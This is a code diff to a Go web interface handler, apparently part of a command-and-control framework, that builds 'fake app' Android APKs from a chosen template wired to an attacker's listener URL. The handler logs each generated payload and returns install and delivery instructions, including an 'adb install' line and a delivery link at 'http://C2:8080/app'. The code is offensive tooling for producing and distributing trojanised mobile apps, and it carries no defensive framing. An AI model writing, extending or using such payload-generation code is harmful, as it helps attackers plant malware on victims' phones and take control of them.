@@ -156,14 +156,28 @@ func (w *WebUI) handlePayloadGenerate(rw http.ResponseWriter, r *http.Request) {
 
 	case "app":
 		if req.AppTemplate == "" {
-			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: "app_template is required"})
+			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: "Select a template from the dropdown"})
 			return
 		}
-		output, err := payloads.BuildMobileApp(req.AppTemplate, req.ListenerURL, "build/payloads/apps")
+		// Build a ready-to-install APK using the selected template
+		apkPath, err := payloads.BuildAndroidAPKWithTemplate(req.ListenerURL, "build/payloads", req.AppTemplate)
 		if err != nil {
-			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: err.Error()})
+			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: fmt.Sprintf("APK build failed: %v", err)})
 		} else {
-			json.NewEncoder(rw).Encode(PayloadResponse{Success: true, Message: output, Type: "app"})
+			info, _ := os.Stat(apkPath)
+			size := "unknown"
+			if info != nil {
+				size = fmt.Sprintf("%.1f KB", float64(info.Size())/1024)
+			}
+			AddPayloadRecord("app-"+req.AppTemplate, filepath.Base(apkPath), apkPath, size, req.ListenerURL)
+			json.NewEncoder(rw).Encode(PayloadResponse{
+				Success:  true,
+				Message:  fmt.Sprintf("Fake app APK built: %s (%s)\nTemplate: %s\nInstall: adb install %s\nDelivery: http://C2:8080/app", apkPath, size, req.AppTemplate, apkPath),
+				Filename: filepath.Base(apkPath),
+				FilePath: apkPath,
+				Size:     size,
+				Type:     "app",
+			})
 		}
 
 	default:
